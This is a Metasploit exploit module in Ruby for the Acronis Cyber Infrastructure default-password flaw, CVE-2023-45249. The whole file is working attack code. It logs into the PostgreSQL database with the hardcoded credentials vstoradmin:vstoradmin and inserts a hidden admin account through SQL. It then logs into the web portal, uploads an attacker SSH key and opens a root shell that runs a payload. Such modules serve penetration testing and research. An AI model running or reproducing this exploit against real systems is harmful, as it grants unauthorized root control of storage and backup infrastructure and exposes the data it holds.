##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sshkey'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include BCrypt
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Postgres
  include Msf::Exploit::Remote::SSH
  prepend Msf::Exploit::Remote::AutoCheck

  # ssh_socket
  attr_accessor :ssh_socket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Acronis Cyber Infrastructure default password remote code execution',
        'Description' => %q{
          Acronis Cyber Infrastructure (ACI) is an IT infrastructure solution that provides storage,
          compute, and network resources. Businesses and Service Providers are using it for data storage,
          backup storage, creating and managing virtual machines and software-defined networks, running
          cloud-native applications in production environments.
          This module exploits a default password vulnerability in ACI which allow an attacker to access
          the ACI PostgreSQL database and gain administrative access to the ACI Web Portal.
          This opens the door for the attacker to upload SSH keys that enables root access
          to the appliance/server. This attack can be remotely executed over the WAN as long as the
          PostgreSQL and SSH services are exposed to the outside world.
          ACI versions 5.0 before build 5.0.1-61, 5.1 before build 5.1.1-71, 5.2 before build 5.2.1-69,
          5.3 before build 5.3.1-53, and 5.4 before build 5.4.4-132 are vulnerable.
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
          'Acronis International GmbH', # discovery
        ],
        'References' => [
          ['CVE', '2023-45249'],
          ['URL', 'https://security-advisory.acronis.com/advisories/SEC-6452'],
          ['URL', 'https://attackerkb.com/topics/T2b62daDsL/cve-2023-45249']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Privileged' => true,
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Interactive SSH',
            {
              'Type' => :ssh_interact,
              'DefaultOptions' => {
                'PAYLOAD' => 'generic/ssh/interact'
              },
              'Payload' => {
                'Compat' => {
                  'PayloadType' => 'ssh_interact'
                }
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-07-24',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 8888,
          'USERNAME' => 'vstoradmin',
          'PASSWORD' => 'vstoradmin',
          'DATABASE' => 'keystone',
          'SSH_TIMEOUT' => 30,
          'WfsDelay' => 5
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the Acronis Cyber Infra application', '/']),
      OptPort.new('DBPORT', [true, 'PostgreSQL DB port', 6432]),
      OptPort.new('SSHPORT', [true, 'SSH port', 22]),
      OptString.new('PRIV_KEY_FILE', [false, 'SSH private key file in PEM format (ssh-keygen -t rsa -b 2048 -m PEM -f <priv_key_file>)', ''])
    ])
    register_advanced_options([
      OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 10])
    ])
  end

  # add an admin user to the Acronis PostgreSQL DB (keystone) using default credentials (vstoradmin:vstoradmin)
  def add_admin_user(username, userid, password)
    vprint_status("Creating admin user #{username} with userid #{userid}")

    # add new admin user to the user table
    res_query = postgres_query("INSERT INTO \"user\" VALUES(\'#{userid}\','{}','T',NULL,NULL,NULL,'default');", datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    # add new admin user to the local_user table
    res_query = postgres_query('SELECT * FROM "local_user" WHERE id = ( SELECT MAX (id) FROM "local_user" );', datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    id_luser = res_query[:complete].rows[0][0].to_i + 1
    res_query = postgres_query("INSERT INTO \"local_user\" VALUES(\'#{id_luser}\',\'#{userid}\','default',\'#{username}\',NULL,NULL);", datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    # hash the password
    password_hash = Password.create(password)
    today = Date.today
    vprint_status("Setting password #{password} with hash #{password_hash}")
    res_query = postgres_query('SELECT * FROM "password" WHERE id = ( SELECT MAX (id) FROM "password" );', datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    id_pwd = res_query[:complete].rows[0][0].to_i + 1
    res_query = postgres_query("INSERT INTO \"password\" VALUES(\'#{id_pwd}\',\'#{id_luser}\',NULL,'F',\'#{password_hash}\',0,NULL,DATE \'#{today}\');", datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    # Getting the admin roles and assign this to the new admin user
    vprint_status('Getting the admin roles')
    res_query = postgres_query("SELECT * FROM \"project\" WHERE name = 'admin' AND domain_id = 'default';", datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    id_project_role = res_query[:complete].rows[0][0]
    res_query = postgres_query("SELECT * FROM \"role\" WHERE name = 'admin';", datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    id_admin_role = res_query[:complete].rows[0][0]
    vprint_status("Assigning the admin roles: #{id_project_role} and #{id_admin_role}")
    res_query = postgres_query("INSERT INTO \"assignment\" VALUES('UserProject',\'#{userid}\',\'#{id_project_role}\',\'#{id_admin_role}\','F');", datastore['VERBOSE'])
    return false unless res_query.keys[0] == :complete

    vprint_status("Successfully created admin user #{username} with password #{password} to access the Acronis Admin Portal.")
    true
  end

  # create SSH session.
  # based on the ssh_opts can this be key or password based.
  # if login is successfull, return true else return false. All other errors will trigger an immediate fail
  def do_sshlogin(ip, user, ssh_opts)
    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        self.ssh_socket = Net::SSH.start(ip, user, ssh_opts)
      end
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, 'Timed out during negotiation')
    rescue Net::SSH::AuthenticationFailed
      return false
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end

    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless ssh_socket
    return true
  end

  # login at the Acronis Cyber Infrastructure web portal
  def aci_login(name, pwd)
    post_data = {
      username: name.to_s,
      password: pwd.to_s
    }.to_json
    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'uri' => normalize_uri(target_uri.path, 'api', 'v2', 'login'),
      'data' => post_data.to_s
    })
    return res&.code == 200
  end

  # returns cluster id or nil if not found
  def get_cluster_id
    res = send_request_cgi({
      'method' => 'GET',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'uri' => normalize_uri(target_uri.path, 'api', 'v2', 'clusters')
    })

    return unless res&.code == 200
    return unless res.body.include?('data') && res.body.include?('id')

    # parse json response and get the version
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['data'].each do |cluster|
      return cluster['id'] unless cluster['id'].nil?
    end
  end

  # upload the SSH public key using the cluster_id defined at the Acronis Cyber Infrastructure web portal
  def upload_sshkey(sshkey, cluster_id)
    post_data = {
      key: sshkey.to_s,
      event:
      {
        name: 'SshKeys',
        method: 'post',
        data:
        {
          key: sshkey.to_s
        }
      }
    }.to_json
    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'uri' => normalize_uri(target_uri.path, 'api', 'v2', cluster_id.to_s, 'ssh-keys'),
      'data' => post_data.to_s
    })
    return true if res&.code == 202 && res.body.include?('task_id')

    false
  end

  def execute_command(cmd, _opts = {})
    Timeout.timeout(datastore['WfsDelay']) { ssh_socket.exec!(cmd) }
  rescue Timeout::Error
    @timeout = true
  end

  # return ACI version-release string or nil if not found
  def get_aci_version
    res = send_request_cgi({
      'method' => 'GET',
      'ctype' => 'application/json',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'uri' => normalize_uri(target_uri.path, 'api', 'v2', 'about')
    })

    return unless res&.code == 200
    return unless res.body.include?('storage-release')

    # parse json response and get the version
    res_json = res.get_json_document
    return if res_json.blank?

    version = res_json['storage-release']['version']
    return if version.nil?

    release = res_json['storage-release']['release']
    return if release.nil?

    "#{version}-#{release}".gsub(/[[:space:]]/, '')
  end

  def check
    version_release = get_aci_version
    return CheckCode::Unknown('Could not retrieve the version information.') if version_release.nil?
    return CheckCode::Appears("Version #{version_release}") if Rex::Version.new(version_release) < Rex::Version.new('5.0.1-61')

    case version_release.split(/\.\d-/)[0]
    when '5.0'
      return CheckCode::Appears("Version #{version_release}") if Rex::Version.new(version_release) < Rex::Version.new('5.0.1-61')
    when '5.1'
      return CheckCode::Appears("Version #{version_release}") if Rex::Version.new(version_release) < Rex::Version.new('5.1.1-71')
    when '5.2'
      return CheckCode::Appears("Version #{version_release}") if Rex::Version.new(version_release) < Rex::Version.new('5.2.1-69')
    when '5.3'
      return CheckCode::Appears("Version #{version_release}") if Rex::Version.new(version_release) < Rex::Version.new('5.3.1-53')
    when '5.4'
      return CheckCode::Appears("Version #{version_release}") if Rex::Version.new(version_release) < Rex::Version.new('5.4.4-132')
    end
    CheckCode::Safe("Version #{version_release}")
  end

  def exploit
    # connect to the PostgreSQL DB with default credentials
    fail_with(Failure::Unreachable, "Can not connect to PostgreSQL DB on port #{datastore['DBPORT']}.") unless postgres_login({ port: datastore['DBPORT'] }) == :connected

    # add a new admin user
    username = Rex::Text.rand_text_alphanumeric(5..8).downcase
    userid = SecureRandom.hex
    password = Rex::Text.rand_password
    print_status("Creating admin user #{username} with password #{password} for access at the Acronis Admin Portal.")
    fail_with(Failure::BadConfig, "Adding admin credentials #{username}:#{password} failed.") unless add_admin_user(username, userid, password)

    # storing credentials at the msf database
    print_status('Saving admin credentials at the msf database.')
    store_valid_credential(user: username, private: password)

    # log out from the postsgreSQL DB
    postgres_logout if postgres_conn

    # create or use own SSH private key
    if datastore['PRIV_KEY_FILE'].blank?
      print_status('Creating SSH private and public key.')
      k = SSHKey.generate(comment: 'root')
    else
      print_status("Using your own SSH private key file: #{datastore['PRIV_KEY_FILE']} in PEM format.")
      fail_with(Failure::NotFound, "Can not find or open SSH private key file: #{datastore['PRIV_KEY_FILE']}") unless File.file?(File.expand_path(datastore['PRIV_KEY_FILE']))
      f = File.read(File.expand_path(datastore['PRIV_KEY_FILE']))
      k = SSHKey.new(f, comment: 'root')
    end
    vprint_status(k.private_key)
    vprint_status(k.ssh_public_key)

    # storing SSH public and private key at the msf database
    print_status('Saving SSH public and private key pair at the msf database.')
    store_valid_credential(user: 'ACI SSH public key', private: k.ssh_public_key)
    store_valid_credential(user: 'ACI SSH private key', private: k.private_key)

    # log in with the new admin user credentials at the Acronis Admin Portal
    fail_with(Failure::NoAccess, "Failed to authenticate at the Acronis Admin Portal with #{username} and #{password}") unless aci_login(username, password)

    # get cluster id to upload the SSH keys
    print_status('Getting the cluster information to upload the SSH public key at the Acronis Admin Portal.')
    cluster_id = get_cluster_id
    fail_with(Failure::NotFound, 'Can not find a cluster and retrieve the id.') if cluster_id.nil?

    # upload the public ssh key at the Acronis Admin Portal to enable root access via SSH
    print_status('Uploading SSH public key at the Acronis Admin Portal.')
    fail_with(Failure::NoAccess, 'Failed to upload SSH public key.') unless upload_sshkey(k.ssh_public_key, cluster_id)

    # login with SSH private key to establish SSH root session
    ssh_opts = ssh_client_defaults.merge({
      auth_methods: ['publickey'],
      key_data: [ k.private_key ],
      port: datastore['SSHPORT']
    })
    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    print_status('Authenticating with SSH private key.')
    fail_with(Failure::NoAccess, 'Failed to authenticate with SSH.') unless do_sshlogin(datastore['RHOST'], 'root', ssh_opts)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :ssh_interact
      handler(ssh_socket)
      return
    end
    @timeout ? ssh_socket.shutdown! : ssh_socket.close
  end
end
